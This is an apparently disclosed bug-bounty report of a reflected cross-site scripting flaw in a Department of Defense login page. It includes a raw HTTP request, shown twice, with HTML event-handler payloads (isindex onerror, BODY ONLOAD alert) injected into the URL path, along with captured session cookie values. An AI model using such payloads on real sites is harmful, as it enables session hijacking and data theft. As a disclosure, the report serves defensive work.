# Xss  Parameter: /<s>/[*]/<s>.css ████████

## Report Details
- **Report ID**: 2353131
- **URL**: https://hackerone.com/reports/2353131
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-02-02T20:13:20.771Z
- **Disclosed**: 2024-03-22T17:44:22.194Z

## Reporter
- **Username**: chor4o
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi teams,

Xss  Parameter: /<s>/[*]/<s>.css ████████ - Request

GET /login.php/styles<isindex%20type=image%20src=1%20onerror=chor4o(9939)>/"><BODY%20ONLOAD=alert(0x000123)>/local.css HTTP/1.1
Referer: https://███
Cookie: PHPSESSID=l7c1vrsg3dbkgsp2lturjs6kca; session=expiry=█████████; f5avraaaaaaaaaaaaaaaa_session_=DPCHLFADPAJCEMEHGHPOJHBKFGOENAGMGICMOOEBEBBAAMBIPCONEIJCEAGKJOOHAKODPBGOGKMAGOAEFOLAEJAKGNEKCIDJNPNMNCNBDOBDLCEGHGMMPGOEGEOPDMHD; BIGipServerweb-ext_pl=!EeLnWrrwaS8YcvQX1TcgTbCc8QSXMr/IS1+eEgDpVv96YCkn5MOqzqftXSRg0sMRVo16MATZlNeRUg==; nmstat=3aa48c20-a118-1d8b-744c-1042bec21eb1; _ga=GA1.2.736871804.1706875700; _gid=GA1.2.331161195.1706875701; _gat=1; _ga_LY79N0FLBS=GS1.1.1706892569.5.1.1706897365.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Host: ████
Connection: Keep-alive

███


███

## Impact

The attacker can steal data from whoever checks the report.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Burp - Request

GET /login.php/styles<isindex%20type=image%20src=1%20onerror=chor4o(9939)>/"><BODY%20ONLOAD=alert(0x000123)>/local.css HTTP/1.1
Referer: https://█████████
Cookie: PHPSESSID=l7c1vrsg3dbkgsp2lturjs6kca; session=expiry=███; f5avraaaaaaaaaaaaaaaa_session_=DPCHLFADPAJCEMEHGHPOJHBKFGOENAGMGICMOOEBEBBAAMBIPCONEIJCEAGKJOOHAKODPBGOGKMAGOAEFOLAEJAKGNEKCIDJNPNMNCNBDOBDLCEGHGMMPGOEGEOPDMHD; BIGipServerweb-ext_pl=!EeLnWrrwaS8YcvQX1TcgTbCc8QSXMr/IS1+eEgDpVv96YCkn5MOqzqftXSRg0sMRVo16MATZlNeRUg==; nmstat=3aa48c20-a118-1d8b-744c-1042bec21eb1; _ga=GA1.2.736871804.1706875700; _gid=GA1.2.331161195.1706875701; _gat=1; _ga_LY79N0FLBS=GS1.1.1706892569.5.1.1706897365.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Host: ██████████
Connection: Keep-alive


████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
